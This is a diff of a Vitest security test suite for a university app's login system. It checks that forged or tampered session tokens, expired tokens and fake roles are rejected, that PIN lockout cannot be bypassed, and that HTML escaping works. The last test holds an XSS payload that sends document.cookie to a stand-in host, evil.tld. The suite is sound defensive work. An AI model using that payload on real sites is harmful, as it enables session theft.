@@ -1,4 +1,17 @@
-import { describe, it, expect } from "vitest";
+import { describe, it, expect, vi } from "vitest";
+
+vi.mock("next/headers", () => ({
+  cookies: vi.fn(async () => ({
+    get: vi.fn(() => undefined),
+    set: vi.fn(),
+    delete: vi.fn(),
+  })),
+}));
+
+vi.mock("next/cache", () => ({
+  revalidatePath: vi.fn(),
+}));
+
 import {
   signSessionToken,
   verifySessionToken,
@@ -7,28 +20,30 @@ import {
   clearPinAttempts,
 } from "@/lib/auth/token-signer";
 import type { UniversitySessionPayload } from "@/lib/auth/university-id";
-import { registerUniversityAccount } from "@/actions/auth.actions";
+import {
+  registerUniversityAccount,
+  signInWithUniversityCredentials,
+} from "@/actions/auth.actions";
+import { escapeHtml } from "@/lib/utils";
 
 describe("Red-Team Security Penetration Suite", () => {
   const validStudentPayload: UniversitySessionPayload = {
-    userId: "stu_b23f0184cs042",
+    userId: "cm0userstudent00000000001",
     identifier: "B23F0184CS042",
     email: "b23f0184cs042@students.university.edu",
-    fullName: "Abdullah Jan (B23F0184CS042)",
+    fullName: "Areeba Noor (B23F0184CS042)",
     role: "STUDENT",
     departmentId: "cm0deptbscs00000000000001",
     departmentCode: "BSCS",
   };
 
   it("Exploit 1 Defense: rejects forged unsigned JSON cookies and tampered HMAC payloads escalating STUDENT -> ADMIN", () => {
-    // 1. Raw unsigned JSON cookie injection
     const rawForgedJson = JSON.stringify({
       ...validStudentPayload,
       role: "ADMIN",
     });
     expect(verifySessionToken(rawForgedJson)).toBeNull();
 
-    // 2. Signed valid token, then attacker modifies base64 payload to role: "ADMIN" keeping original signature
     const legitimateToken = signSessionToken(validStudentPayload);
     expect(verifySessionToken(legitimateToken)?.role).toBe("STUDENT");
 
@@ -41,7 +56,6 @@ describe("Red-Team Security Penetration Suite", () => {
 
     expect(verifySessionToken(tamperedToken)).toBeNull();
 
-    // 3. Forged signature with valid payload
     const forgedSigToken = `${tamperedPayloadEncoded}.forged_hmac_signature_12345`;
     expect(verifySessionToken(forgedSigToken)).toBeNull();
   });
@@ -57,7 +71,6 @@ describe("Red-Team Security Penetration Suite", () => {
       expect(checkPinRateLimit(targetId).allowed).toBe(true);
     }
 
-    // 5th failed attempt triggers 15-minute lockout
     const fifthAttempt = recordFailedPinAttempt(targetId);
     expect(fifthAttempt.locked).toBe(true);
     expect(fifthAttempt.remainingAttempts).toBe(0);
@@ -92,5 +105,71 @@ describe("Red-Team Security Penetration Suite", () => {
     if (!attemptAdmin.ok) {
       expect(attemptAdmin.error.code).toBe("VALIDATION_ERROR");
     }
+  });
+
+  it("Exploit 4 Defense: rejects expired HMAC session tokens and unknown role claims", () => {
+    const expiredToken = signSessionToken({
+      ...validStudentPayload,
+      iat: Date.now() - 10 * 24 * 60 * 60 * 1000,
+      exp: Date.now() - 1000,
+    });
+    expect(verifySessionToken(expiredToken)).toBeNull();
+
+    const unknownRoleToken = signSessionToken({
+      ...validStudentPayload,
+      role: "SUPERUSER" as UniversitySessionPayload["role"],
+    });
+    expect(verifySessionToken(unknownRoleToken)).toBeNull();
+  });
+
+  it("Exploit 5 Defense: prevents faculty handle-vs-email rate-limit bypass across 5 failed attempts", async () => {
+    clearPinAttempts("faculty:kamran.siddiqui");
+
+    // 3 failed attempts via full email
+    for (let i = 0; i < 3; i++) {
+      const res = await signInWithUniversityCredentials({
+        loginMode: "FACULTY",
+        identifier: "kamran.siddiqui@university.edu",
+        pin: "0000",
+      });
+      expect(res.ok).toBe(false);
+    }
+
+    // 2 failed attempts switching to short handle — must share the same canonical lockout bucket
+    await signInWithUniversityCredentials({
+      loginMode: "FACULTY",
+      identifier: "kamran.siddiqui",
+      pin: "0000",
+    });
+    const fifth = await signInWithUniversityCredentials({
+      loginMode: "FACULTY",
+      identifier: "kamran.siddiqui",
+      pin: "0000",
+    });
+
+    expect(fifth.ok).toBe(false);
+    if (!fifth.ok) {
+      expect(fifth.error.code).toBe("RATE_LIMITED");
+    }
+
+    // Even providing the right PIN while locked must be blocked
+    const blockedValid = await signInWithUniversityCredentials({
+      loginMode: "FACULTY",
+      identifier: "kamran.siddiqui@university.edu",
+      pin: "2026",
+    });
+    expect(blockedValid.ok).toBe(false);
+    if (!blockedValid.ok) {
+      expect(blockedValid.error.code).toBe("RATE_LIMITED");
+    }
+
+    clearPinAttempts("faculty:kamran.siddiqui");
+  });
+
+  it("Exploit 6 Defense: neutralizes HTML/XSS injection payloads via escapeHtml()", () => {
+    const malicious = `<script>fetch("https://evil.tld?c="+document.cookie)</script>`;
+    const escaped = escapeHtml(malicious);
+    expect(escaped).not.toContain("<script>");
+    expect(escaped).toContain("&lt;script&gt;");
   });
 });
